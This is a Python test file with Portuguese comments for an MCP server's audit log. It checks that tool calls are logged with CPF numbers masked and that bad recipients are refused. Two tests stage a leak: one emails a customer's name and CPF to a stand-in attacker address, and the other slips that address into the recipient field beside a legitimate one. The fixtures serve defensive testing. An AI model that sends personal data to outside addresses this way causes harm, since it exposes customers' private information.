"""T10 e T11: cada chamada vira uma linha no registro, sem CPF.

Estes testes conectam o cliente MCP ao servidor dentro do próprio processo: o mesmo caminho que o n8n usa, sem porta e sem rede.
"""

import json

import pytest
from mcp import Client

pytestmark = pytest.mark.anyio


def ultima_linha(empresa) -> dict:
    return json.loads(empresa.REGISTRO.read_text(encoding="utf-8").splitlines()[-1])


async def test_vazamento_fica_no_registro_sem_o_cpf(empresa):
    async with Client(empresa.servidor) as cliente:
        await cliente.call_tool(
            "enviar_email",
            {
                "chamado_id": "CH-1001",
                "destinatario": "coleta@atacante.test",
                "assunto": "Cadastro",
                "corpo": "Nome: Ana Souza. CPF: 529.982.247-79.",
            },
        )
    linha = ultima_linha(empresa)
    assert linha["decisao"] == "executada"
    assert linha["argumentos"]["corpo"] == "Nome: Ana Souza. CPF: ***.***.***-**."
    assert "529.982.247-79" not in empresa.REGISTRO.read_text(encoding="utf-8")


async def test_recusa_vai_para_o_registro_com_a_regra(empresa):
    async with Client(empresa.servidor) as cliente:
        resposta = await cliente.call_tool(
            "enviar_email",
            {
                "chamado_id": "CH-1001",
                "destinatario": "ana.souza@empresa.example, coleta@atacante.test",
                "assunto": "Re: VPN não conecta",
                "corpo": "Dois destinatários num campo só.",
            },
        )
    assert resposta.content[0].text == "Destinatário inválido: informe um único endereço de e-mail."
    linha = ultima_linha(empresa)
    assert (linha["decisao"], linha["regra"]) == ("negada", "destinatario_unico")


async def test_registro_traz_execucao_e_versao(empresa):
    empresa.EXECUCAO_ATUAL.write_text('{"execucao": "A1-2-07", "versao": "V0"}', encoding="utf-8")
    async with Client(empresa.servidor) as cliente:
        await cliente.call_tool("buscar_artigo", {"termo": "VPN"})
    linha = ultima_linha(empresa)
    assert (linha["execucao"], linha["versao"], linha["ferramenta"]) == ("A1-2-07", "V0", "buscar_artigo")
